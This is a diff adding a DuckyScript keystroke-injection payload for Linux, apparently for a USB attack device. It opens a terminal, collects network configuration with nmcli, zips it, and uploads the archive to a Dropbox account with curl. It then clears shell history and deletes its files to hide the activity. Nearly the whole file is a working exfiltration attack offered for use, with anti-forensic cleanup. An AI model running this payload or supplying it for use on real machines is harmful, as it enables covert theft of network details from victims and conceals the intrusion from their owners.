@@ -1,0 +1,96 @@
+
+REM ##########################################################
+REM #                                                        |
+REM # Title        : Exfiltrate Linux Network Configuration  |
+REM # Author       : Aleff                                   |
+REM # Version      : 1.0                                     |
+REM # Category     : Exfiltration, Execution                 |
+REM # Target       : Linux                                   |
+REM #                                                        |
+REM ##########################################################
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Dropbox Account
+REM     - - DROPBOX_ACCESS_TOKEN
+
+DELAY 1000
+CTRL-ALT t
+
+DELAY 2000
+REM Required: Set here your Dropbox access TOKEN
+DEFINE TOKEN example
+STRING ACCESS_TOKEN="
+STRING TOKEN
+STRING "
+ENTER
+
+REM DELAY 500
+REM STRING USER_NAME=$(whoami)
+REM ENTER
+
+DELAY 500
+STRING RANDOM=$(shuf -i 1-999999999999 -n 1)
+ENTER
+
+DELAY 500
+STRING ZIP_NAME="$RANDOM.zip"
+ENTER
+DELAY 500
+STRING ZIP_PATH="/home/$USER_NAME/Documents/$ZIP_NAME"
+ENTER
+
+REM Folder path
+DELAY 500
+STRING TMP_FOLDER_PATH=$(mktemp -d -p "/home/$USER_NAME/Documents" prefix-XXXXXXXXXX)
+ENTER
+
+DELAY 500
+STRING nmcli > "$TMP_FOLDER_PATH/nmcli.txt"
+ENTER
+
+DELAY 1000
+STRING nmcli connection show > "$TMP_FOLDER_PATH/nmcli_connection.txt"
+ENTER
+
+DELAY 1000
+STRING nmcli device show > "$TMP_FOLDER_PATH/nmcli_device.txt"
+ENTER
+
+DELAY 1000
+REM Delay for zipping operation, it depends by computer power and folder directory
+STRING zip -r "$ZIP_PATH" "$TMP_FOLDER_PATH"
+DELAY 3000
+
+
+REM Set yout Dropbox folder name
+DEFINE DROPBOX_FOLDER_NAME example
+STRING DROPBOX_FOLDER="/
+ENTER
+STRING DROPBOX_FOLDER_NAME
+ENTER
+STRING "
+ENTER
+DELAY 500
+
+DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
+STRING curl -X POST
+STRING DROPBOX_API_CONST
+STRING --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
+ENTER
+
+DELAY 2000
+STRING history -c
+ENTER
+
+DELAY 500
+STRING rm -rf "$TMP_FOLDER_PATH"
+ENTER
+
+DELAY 500
+STRING rm -rf "$ZIP_PATH"
+ENTER
+
+DELAY 500
+STRING exit
+ENTER
